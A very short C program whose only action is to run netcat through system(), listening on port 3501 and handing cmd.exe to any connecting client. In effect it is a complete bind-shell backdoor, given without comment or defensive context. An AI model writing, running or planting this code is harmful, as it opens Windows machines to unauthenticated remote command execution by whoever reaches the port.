#include <stdio.h>
#include <stdlib.h>

int main() {
	system("nc -Lp 3501 -n -vv -e cmd.exe");
	return 0;
}
